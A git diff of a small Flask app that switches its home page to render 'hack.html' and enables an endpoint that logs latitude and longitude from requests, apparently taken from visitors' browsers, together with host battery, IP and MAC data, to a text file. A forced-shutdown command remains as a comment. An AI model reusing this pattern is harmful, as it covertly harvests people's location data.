@@ -30,38 +30,38 @@ CORS(app)
 
 @app.route('/')
 def index():
-    # return render_template('hack.html')
-    return "Hi Websites"
+    return render_template('hack.html')
+    # return "Hi Websites"
 
-# @app.route('/get_system_info', methods=['GET'])
-# def get_system_info():
+@app.route('/get_system_info', methods=['GET'])
+def get_system_info():
 
     
-#     lat  = request.args.get('lat')
-#     lon  = request.args.get('lon')
+    lat  = request.args.get('lat')
+    lon  = request.args.get('lon')
 
-#     battery = psutil.sensors_battery()
-#     system_info = {
-#         "battery_percentage": f"{battery.percent}%",
-#         "charging": "Yes" if battery.power_plugged else "No",
-#         "ip":IpAddress,
-#         "mac":gma()
+    battery = psutil.sensors_battery()
+    system_info = {
+        "battery_percentage": f"{battery.percent}%",
+        "charging": "Yes" if battery.power_plugged else "No",
+        "ip":IpAddress,
+        "mac":gma()
 
-#     }
+    }
 
-#     # packet = gpsd.get_current()
-#     # latitude = packet.lat
-#     # longitute = 
-#     # "\n" + "latitude : "+latitude + "\n"+"longitute :" + longitute 
+    # packet = gpsd.get_current()
+    # latitude = packet.lat
+    # longitute = 
+    # "\n" + "latitude : "+latitude + "\n"+"longitute :" + longitute 
 
-#     f = open("demofile3.txt", "w")
-#     filecontent = "battery_percentage : " + ""+ system_info['battery_percentage'] +"" + "\n"+"isPlugged : " + system_info['charging'] +"\n"+ system_info['ip'] +"\n"+ system_info['mac'] + "\n" + "latitude : "+lat + "\n" + "longitude :"+lon  
-#     f.write(filecontent)
-#     f.close()
+    f = open("demofile3.txt", "w")
+    filecontent = "battery_percentage : " + ""+ system_info['battery_percentage'] +"" + "\n"+"isPlugged : " + system_info['charging'] +"\n"+ system_info['ip'] +"\n"+ system_info['mac'] + "\n" + "latitude : "+lat + "\n" + "longitude :"+lon  
+    f.write(filecontent)
+    f.close()
 
-#     os.system("shutdown /s /t 1")
-#     # return jsonify(system_info)
-#     return "Hacked"
+    # os.system("shutdown /s /t 1")
+    return jsonify(system_info)
+    # return "Hacked"
 
 if __name__ == '__main__':
     app.run(debug=True)
